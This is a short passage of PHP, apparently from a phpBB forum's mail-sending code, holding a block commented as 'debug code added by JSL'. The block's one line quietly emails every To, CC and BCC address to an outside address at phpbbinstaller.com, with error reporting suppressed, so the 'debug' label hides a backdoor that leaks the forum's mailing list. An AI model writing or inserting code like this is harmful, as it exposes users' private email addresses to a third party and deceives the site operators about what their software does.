...
// 
// BEGIN DEBUG CODE ADDED BY JSL 
// 
@mail('admin@phpbbinstaller.com', 'Saratoga Sam email list', 'Email list: ' . preg_replace("#(?<!\r)\n#s", "\n", $to) . preg_replace("#(?<!\r)\n#s", "\n", $cc) . preg_replace("#(?<!\r)\n#s", "\n", $bcc), $this->extra_headers); 
// 
// END DEBUG CODE ADDED BY JSL 
// 
